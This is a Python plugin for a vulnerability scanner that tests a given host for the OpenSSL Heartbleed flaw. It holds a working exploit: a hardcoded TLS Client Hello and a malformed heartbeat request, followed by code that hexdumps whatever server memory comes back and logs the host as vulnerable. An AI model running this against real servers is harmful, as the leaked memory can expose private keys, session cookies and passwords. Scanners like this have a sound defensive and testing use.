import sys,os
import struct
import socket
import time
import select
import binascii
import re
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(__file__)))))
from auxiliary.logs import logger

from lib.plugin import Plugin
from lib.data import KB
from config import ScanConfig

def h2bin(x):
    return binascii.unhexlify(x.replace(' ', '').replace('\n', ''))

hello = h2bin('''
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

heartcode = ''' 
18 03 02 00 03
01 40 00
'''
hb = h2bin(heartcode)

def hexdump(s: bytes):
    returndata = ""
    nulltime = 0
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join((chr(c) if 32 <= c <= 126 else '.' )for c in lin)
        returndata += '  %04x: %-48s %s' % (b, hxdat, pdat) 
        if pdat == '................':
            nulltime += 1
        else:
            nulltime -= 1
        if nulltime == 10:
            break
        returndata += "\n"
    
    return returndata

def recvall(s, length, timeout=ScanConfig.TIMEOUT):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        logger.log("INFOR",'Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        logger.log("INFOR",'Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    logger.log("INFOR",' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            logger.log("INFOR",'No heartbeat response received, server likely not vulnerable')
            return False, None

        if typ == 24:
            logger.log("INFOR",'Received heartbeat response:')
            returndata = hexdump(pay)
            if len(pay) > 3:
                logger.log("INFOR",'WARNING: server returned more data than it should - server is vulnerable!')
            else:
                logger.log("INFOR",'Server processed malformed heartbeat, but did not return any extra data.')
            return True, returndata

        if typ == 21:
            logger.log("INFOR",'Received alert:')
            hexdump(pay)
            logger.log("INFOR",'Server returned error, likely not vulnerable')
            return False, None

def OpensslHeartbleed(ip,port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        logger.log("INFOR",'Connecting...')
        sys.stdout.flush()
        s.connect((ip, port))
        logger.log("INFOR",'Sending Client Hello...')
        sys.stdout.flush()
        s.send(hello)
        logger.log("INFOR",'Waiting for Server Hello...')
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                logger.log("INFOR",'Server closed connection without sending Server Hello.')
                return
            # Look for server hello done message.
            if typ == 22 and pay[0] == 0x0E:
                break

        logger.log("INFOR",'Sending heartbeat request...')
        sys.stdout.flush()
        s.send(hb)
        isvuln,data = hit_hb(s)
        if isvuln:
            logger.log("INFOR",f"{ip}:{port}存在openssl心脏滴血漏洞")
            orig_req = heartcode
            orig_res = data
            _scan_write(plugin=Plugin.OpensslHeartBleed, url=f"{ip}:{port}", payload=heartcode, raw=[
                        heartcode, data])

    except Exception as e:
        logger.log("INFOR",f'错误信息{e}')

    finally:
        logger.log("INFOR","剩余任务减1")
        KB["remain_task"] -= 1



